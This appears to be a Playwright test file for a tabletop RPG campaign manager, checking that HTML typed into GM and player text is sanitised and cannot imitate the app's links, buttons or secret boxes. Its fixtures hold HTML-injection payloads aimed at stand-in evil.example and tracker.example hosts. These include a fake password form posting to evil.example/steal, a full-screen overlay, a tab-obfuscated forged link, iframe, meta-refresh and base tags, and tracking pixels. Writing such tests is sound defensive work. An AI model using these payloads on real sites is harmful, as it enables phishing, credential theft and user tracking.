import type { Locator } from '@playwright/test'
import { expect, here, open, test, type Page } from './fixtures'
import { getRecord, patchRecord, putBack } from './lib/records'
import { makePlayerCopy, offline } from './lib/playerCopy'
import type { Entity, World } from './lib/world'

/**
 * Text typed into the app can't pass for the app itself (src/Markdown.tsx). Typed HTML keeps no
 * forms, buttons, styles or frames, and can't make the app's [[links]], roll buttons, "Add to notes"
 * buttons or secret boxes. What a player wrote (their character's own words, the party's notes)
 * shows its HTML as typed, has no ":::" passages and shows no pictures from other websites. The
 * app's own [[links]], rolls, pictures and :::gm / :::for passages still work, and players never
 * get the name of a GM-only page hidden behind a link's label.
 *
 * Each test puts back what it changed (straight in the database), since tests in one worker share
 * the world.
 */

const pcPage = (world: World) => world.playerPages.find((e) => e.type === 'pc')!
const otherPage = (world: World, not: string) => world.playerPages.find((e) => e.type === 'npc' && e.id !== not)!
const gmOnly = (world: World) => world.dump.entities.find((e) => e.visibility === 'gm' && !e.template && e.type === 'npc')!

/** A picture from the world's files (one the example drew), for an ![](asset:…) in the text. */
const somePicture = (page: Page) =>
  page.evaluate(
    () =>
      new Promise<string>((resolve, reject) => {
        const req = indexedDB.open('ttrpg-campaign-manager')
        req.onerror = () => reject(req.error)
        req.onsuccess = () => {
          const idb = req.result
          const all = idb.transaction('assets', 'readonly').objectStore('assets').getAll()
          all.onsuccess = () => {
            idb.close()
            const rows = all.result as { id: string; mime?: string; size?: number }[]
            resolve(rows.find((a) => /^[0-9a-f-]{36}$/i.test(a.id) && /^image\//.test(a.mime ?? '') && (a.size ?? 0) > 0)?.id ?? '')
          }
          all.onerror = () => reject(all.error)
        }
      }),
  )

/** The GM's text: the app's own parts, then what the audit typed to pass for the app. */
const gmText = (o: { other: Entity; gm: Entity; pc: Entity; session: { id: string; number: number }; picture: string }) => `

Normal: [[${o.other.name}]], [[${o.other.name}|the other one]], a toll of roll:2d6+1 silver, ![A test picture](asset:${o.picture}) and ![A web picture](https://pictures.example/castle.png).

:::gm
Only the GM reads this test line.
:::

:::for ${o.pc.name}
Only one player reads this test line.
:::

A stranger: [[${o.gm.name}|the hooded stranger]]. Nobody: [[No Page By This Test Name]].

<form action="https://evil.example/steal"><p>Your sign-in ran out.</p><input type="password" name="p" autocomplete="current-password"><button>Sign in again</button><textarea>x</textarea><select><option>a</option></select></form>

<style>.app-header { display: none }</style>

<div style="position:fixed;inset:0;z-index:99999;background:white">Test overlay words</div>

<a class="wikilink" href="/&#9;/evil.example/signin" data-internal="1" data-id="x">Forged tavern link</a>

<button type="button" class="link small roll-to-notes" data-session="${o.session.id}" data-line="Forged line">Add to #${o.session.number}’s notes</button>

<div class="secret for-you">Forged secret box</div>

<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/object"></object><embed src="https://evil.example/embed"><link rel="stylesheet" href="https://evil.example/sheet.css"><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">
`

/** A player's words on their character's page: the same tricks, plus a tracking picture. */
const playerText = (other: Entity) => `:::foryouYour patron orders you to steal the lantern tonight. Tell no one.:::

:::foryou
A forged block just for you.
:::

:::gm
A forged GM line.
:::

<form action="https://evil.example/steal"><input type="password" name="p"><button>Sign in again</button></form>

<div class="secret for-you">Player forged box</div>

<a class="wikilink" href="/&#9;/evil.example/signin" data-internal="1" data-id="x">Player forged link</a>

![](https://tracker.example/pixel.png?who=gm) and <img src="https://tracker.example/pixel2.png" alt="pixel two">

Still works: [[${other.name}]], roll:2d6+1 and **strong words**.`

/**
 * What typed HTML must never make in shown text: forms and their parts, buttons other than the
 * app's rolls, styles, frames, anything that loads or redirects, style="". Typed links are ordinary
 * links that don't tell the other website where they were; only the app's [[links]] are in-app
 * links, each to a real page by its id.
 */
async function expectNothingForged(text: Locator, world: World) {
  await expect(text.locator('form, input:not([type="checkbox"][disabled]), textarea, select, button:not(.inline-roll), style, iframe, object, embed, link, meta, base, svg, [style]')).toHaveCount(0)
  await expect(text.locator('a:not([data-internal]):not([rel="noopener noreferrer"])')).toHaveCount(0)
  const ids = new Set(world.dump.entities.map((e) => e.id))
  const links = await text.locator('a[data-internal]').evaluateAll((as) => as.map((a) => ({ cls: a.className, id: a.getAttribute('data-id') ?? '', href: a.getAttribute('href') ?? '' })))
  for (const a of links) {
    expect(a.cls).toBe('wikilink')
    expect(ids.has(a.id)).toBe(true)
    expect(a.href).toMatch(/^\/w\/[^/]+\/p\/[^/]+$/)
  }
}

/** Every address the tab asked for, to check nothing went to the audit's made-up websites. */
function requests(page: Page) {
  const asked: string[] = []
  page.on('request', (r) => asked.push(r.url()))
  return () => asked.filter((u) => /evil\.example|tracker\.example/.test(u))
}

test('typed HTML can’t pass for the app, and [[links]], rolls, pictures and secret passages still work for the GM', async ({ page, world }) => {
  const outside = requests(page)
  const pc = pcPage(world)
  const other = otherPage(world, pc.id)
  const gm = gmOnly(world)
  await open(page, `/w/${world.slug}`)
  const picture = await somePicture(page)
  expect(picture).not.toBe('')
  const before = await patchRecord(page, 'entities', pc.id, { body: `${pc.body}${gmText({ other, gm, pc, session: world.session(1), picture })}`, playerBody: playerText(other) })
  try {
    await open(page, `/w/${world.slug}/p/${world.pageSlug(pc.name)}`)
    const text = page.locator('.entity-prose .markdown')
    const theirs = page.locator('.player-written .markdown')
    await expect(text.getByText('Test overlay words')).toBeVisible()
    await expectNothingForged(text, world)
    await expectNothingForged(theirs, world)

    // In the GM's text, what was typed to look like the app is plain: a link that is only a link, a plain box.
    const fake = text.locator('a', { hasText: 'Forged tavern link' })
    expect(await fake.evaluate((a) => [...a.attributes].map((x) => x.name).sort())).toEqual(['href', 'rel'])
    await expect(text.getByText('Forged secret box')).toBeVisible()
    await expect(text.locator('.secret', { hasText: 'Forged secret box' })).toHaveCount(0)

    // The app's own parts still work in the GM's text.
    const link = text.locator('a.wikilink', { hasText: other.name }).first()
    await expect(link).toHaveAttribute('href', `/w/${world.slug}/p/${world.pageSlug(other.name)}`)
    await expect(text.locator('a.wikilink', { hasText: 'the other one' })).toHaveAttribute('data-id', other.id)
    await expect(text.locator('a.wikilink', { hasText: 'the hooded stranger' })).toHaveAttribute('data-id', gm.id)
    const missing = text.locator('.wikilink.missing', { hasText: 'No Page By This Test Name' })
    await expect(missing).toHaveAttribute('data-missing', 'No Page By This Test Name')
    await expect(missing).toHaveAttribute('title', 'No page yet')
    await expect(text.locator('.secret', { hasText: 'Only the GM reads this test line.' })).toBeVisible()
    await expect(text.locator('.secret.for-some', { hasText: 'Only one player reads this test line.' })).toBeVisible()
    await expect.poll(() => text.locator(`img.inline-picture[data-asset="${picture}"]`).getAttribute('src')).toMatch(/^blob:/)
    // The GM's own text may show a picture from the web (the owner's choice); a player's may not (below).
    await expect(text.locator('img[src="https://pictures.example/castle.png"]')).toHaveCount(1)
    const roll = text.locator('.inline-roll-wrap', { hasText: '2d6+1' })
    await roll.locator('button.inline-roll').click()
    await expect(roll.locator('output')).toHaveText(/\d/)

    // A player's words show as they typed them: HTML as text, ":::" lines as text, no boxes, no pictures.
    await expect(theirs).toContainText(':::foryouYour patron orders you to steal the lantern tonight.')
    await expect(theirs).toContainText(':::gm A forged GM line.')
    await expect(theirs).toContainText('<form action="https://evil.example/steal">')
    await expect(theirs).toContainText('<div class="secret for-you">Player forged box</div>')
    await expect(theirs).toContainText('<img src="https://tracker.example/pixel2.png" alt="pixel two">')
    await expect(theirs.locator('.secret')).toHaveCount(0)
    await expect(theirs.locator('img')).toHaveCount(0)
    await expect(theirs.locator('a[href^="https://tracker.example/"]')).toHaveText('picture')
    // ...and their [[links]], rolls and Markdown still work.
    await expect(theirs.locator('a.wikilink', { hasText: other.name })).toHaveAttribute('data-id', other.id)
    await expect(theirs.locator('strong', { hasText: 'strong words' })).toBeVisible()
    await theirs.locator('.inline-roll-wrap', { hasText: '2d6+1' }).locator('button.inline-roll').click()
    await expect(theirs.locator('.inline-roll-wrap', { hasText: '2d6+1' }).locator('output')).toHaveText(/\d/)

    // A link that claims to be the app's (however it got there) never goes where its address says.
    await text.evaluate((el) => {
      const a = document.createElement('a')
      a.setAttribute('href', '/\t/evil.example/signin')
      a.dataset.internal = '1'
      a.dataset.id = 'no-such-page'
      a.textContent = 'Injected link'
      el.append(a)
    })
    const at = here(page)
    await text.getByText('Injected link').click()
    await page.waitForTimeout(300)
    expect(here(page)).toBe(at)

    // A real [[link]] opens its page inside the app (no reload).
    await page.evaluate(() => ((window as unknown as { stayed: boolean }).stayed = true))
    await link.click()
    await expect.poll(() => here(page)).toBe(`/w/${world.slug}/p/${world.pageSlug(other.name)}`)
    expect(await page.evaluate(() => (window as unknown as { stayed?: boolean }).stayed)).toBe(true)
    expect(outside()).toEqual([])
  } finally {
    await putBack(page, 'entities', [[pc.id, before]])
  }
})

test('the warning under a text box names a GM-only page even behind a label', async ({ page, world }) => {
  const p = otherPage(world, pcPage(world).id)
  const gm = gmOnly(world)
  await open(page, `/w/${world.slug}`)
  const before = await patchRecord(page, 'entities', p.id, { body: `${p.body}\n\nA stranger: [[${gm.name}|the hooded stranger]].` })
  try {
    await open(page, `/w/${world.slug}/p/${world.pageSlug(p.name)}`)
    await page.getByRole('button', { name: 'Edit' }).first().click()
    await expect(page.locator('.secret-names')).toContainText(gm.name)
    await page.getByRole('button', { name: 'Cancel' }).first().click()
  } finally {
    await putBack(page, 'entities', [[p.id, before]])
  }
})

test('an “Add to notes” button the app didn’t make does nothing, and the app’s own still adds the roll', async ({ page, world }) => {
  const p = otherPage(world, pcPage(world).id)
  const s = world.session(1)
  await open(page, `/w/${world.slug}`)
  const typed = `<button type="button" class="link small roll-to-notes" data-session="${s.id}" data-line="Forged: Wren keeps the sword">Add to #${s.number}’s notes</button>`
  const beforePage = await patchRecord(page, 'entities', p.id, { body: `${p.body}\n\nThe toll is roll:2d6+1 silver.\n\n${typed}` })
  // Session 1 is being played, so a roll offers to go in its notes.
  const beforeSession = await patchRecord(page, 'sessions', s.id, { startedAt: Date.now(), playedAt: undefined })
  try {
    await open(page, `/w/${world.slug}/p/${world.pageSlug(p.name)}`)
    const text = page.locator('.entity-prose .markdown')
    await expect(text.locator('.inline-roll-wrap', { hasText: '2d6+1' })).toBeVisible()
    // The typed one is gone...
    await expect(text.locator('button.roll-to-notes')).toHaveCount(0)
    // ...and one slipped into the page some other way does nothing when clicked.
    await text.evaluate(
      (el, { id, line }) => {
        const b = document.createElement('button')
        b.type = 'button'
        b.className = 'link small roll-to-notes'
        b.dataset.session = id
        b.dataset.line = line
        b.textContent = 'Injected add to notes'
        el.append(b)
      },
      { id: s.id, line: 'Forged: Wren keeps the sword' },
    )
    await text.getByRole('button', { name: 'Injected add to notes' }).click()
    await page.waitForTimeout(500)
    expect((await getRecord(page, 'sessions', s.id))?.notes).toBe(beforeSession.notes)

    // The app's own button, made after a real roll, adds the roll to the notes once.
    const roll = text.locator('.inline-roll-wrap', { hasText: '2d6+1' })
    await roll.locator('button.inline-roll').click()
    const add = roll.locator('button.roll-to-notes')
    await expect(add).toHaveText(`Add to #${s.number}’s notes`)
    await add.click()
    await expect(add).toHaveText('✓ In the notes')
    await expect.poll(async () => String((await getRecord(page, 'sessions', s.id))?.notes)).toMatch(/Rolled 2d6\+1: \d+$/)
    expect(String((await getRecord(page, 'sessions', s.id))?.notes)).not.toContain('Forged')
  } finally {
    await putBack(page, 'sessions', [[s.id, beforeSession]])
    await putBack(page, 'entities', [[p.id, beforePage]])
  }
})

test.describe('players', () => {
  test.use({ view: 'player' })

  test('players get no GM secret, no GM-only name behind a label and nothing typed that passes for the app', async ({ page, world }) => {
    const outside = requests(page)
    const pc = pcPage(world)
    const other = otherPage(world, pc.id)
    const gm = gmOnly(world)
    await open(page, `/w/${world.slug}`)
    const picture = await somePicture(page)
    const before = await patchRecord(page, 'entities', pc.id, { body: `${pc.body}${gmText({ other, gm, pc, session: world.session(1), picture })}`, playerBody: playerText(other) })
    try {
      await open(page, `/w/${world.slug}/p/${world.pageSlug(pc.name)}`)
      const text = page.locator('.entity-prose .markdown')
      const theirs = page.locator('.player-written .markdown')
      await expect(text.getByText('Test overlay words')).toBeVisible()
      await expectNothingForged(text, world)
      await expectNothingForged(theirs, world)
      await expect(page.getByText(/reads this test line/)).toHaveCount(0)
      await expect(text.locator('.secret', { hasText: 'Forged secret box' })).toHaveCount(0)
      // The label shows; the GM-only page's name is nowhere in it, not even out of sight.
      const stranger = text.locator('.wikilink', { hasText: 'the hooded stranger' })
      await expect(stranger).toHaveCount(1)
      expect(await stranger.evaluate((el) => el.outerHTML)).not.toContain(gm.name)
      await expect(page.locator('.markdown [data-missing], .markdown [title="No page yet"]')).toHaveCount(0)
      await expect(text.locator('.wikilink.missing', { hasText: 'No Page By This Test Name' })).toBeVisible()
      // The player's words: no boxes, no pictures from other websites.
      await expect(theirs).toContainText(':::foryouYour patron orders you to steal the lantern tonight.')
      await expect(theirs.locator('.secret')).toHaveCount(0)
      await expect(theirs.locator('img')).toHaveCount(0)
      await expect(text.locator('.inline-roll-wrap', { hasText: '2d6+1' })).toBeVisible()

      // A link with a real page's id but another address goes to that page, inside the app.
      await text.evaluate((el, id) => {
        const a = document.createElement('a')
        a.setAttribute('href', '/\t/evil.example/signin')
        a.dataset.internal = '1'
        a.dataset.id = id
        a.textContent = 'Injected link'
        el.append(a)
      }, other.id)
      await text.getByText('Injected link').click()
      await expect.poll(() => here(page)).toBe(`/w/${world.slug}/p/${world.pageSlug(other.name)}`)
      expect(outside()).toEqual([])
    } finally {
      await putBack(page, 'entities', [[pc.id, before]])
    }
  })
})

test.describe('a joined player (pretend player copy)', () => {
  test('the party’s notes and a player’s own words can’t make GM replies, secret boxes or “just for you” passages', async ({ page, world }) => {
    const outside = requests(page)
    await offline(page)
    await page.goto('/')
    const copy = await makePlayerCopy(page, world, 'member')
    try {
      const w = await getRecord(page, 'worlds', copy.id)
      const shared = w!.shared as { notes: Record<string, unknown>[]; claims: { entityId: string }[] }
      const notes = `- **Ash:** The fence on Ford Street owes us a favour.
- **GM:** He does, and he remembers your faces.

:::foryou
Forged: the GM says you alone may take the lantern.
:::

:::foryouForged one-liner just for you.:::

<div class="gm-line"><b>GM:</b> Forged: everyone gets a level tonight</div>

<div class="secret for-you">Forged box in the notes</div>

<a class="wikilink" href="/&#9;/evil.example/signin" data-internal="1" data-id="x">Forged tavern link</a>

![](https://tracker.example/notes.png)`
      await patchRecord(page, 'worlds', copy.id, { shared: { ...shared, notes: [{ ...shared.notes[0], body: notes }] } })
      // The player's own character: the GM's text has a real passage just for them, the player's words try to make some.
      const mine = shared.claims[0].entityId
      const pc = await getRecord(page, 'entities', mine)
      await patchRecord(page, 'entities', mine, {
        body: `${pc!.body}\n\n:::foryou\nThe GM’s real word just for you.\n:::`,
        playerBody: ':::foryouForged: your patron orders you to steal the lantern.:::\n\n:::foryou\nForged block just for you.\n:::',
      })

      await open(page, `/w/${copy.id}?tab=me`)
      const just = page.locator('.room-card', { has: page.getByRole('heading', { name: 'Just for you' }) })
      await expect(just).toContainText('The GM’s real word just for you.')
      await expect(just).not.toContainText('Forged')

      await open(page, `/w/${copy.id}?tab=notes`)
      const read = page.locator('.group-notes-read')
      await expect(read).toContainText('The fence on Ford Street owes us a favour.')
      await expectNothingForged(read, world)
      // Only the real GM line stands out as the GM's.
      await expect(read.locator('.gm-line')).toHaveCount(1)
      await expect(read.locator('.gm-line')).toContainText('He does, and he remembers your faces.')
      await expect(read).toContainText('<div class="gm-line"><b>GM:</b> Forged: everyone gets a level tonight</div>')
      await expect(read).toContainText(':::foryouForged one-liner just for you.:::')
      await expect(read.locator('.secret')).toHaveCount(0)
      await expect(read.locator('a[data-internal], img')).toHaveCount(0)
      expect(outside()).toEqual([])
    } finally {
      await copy.remove()
    }
  })
})
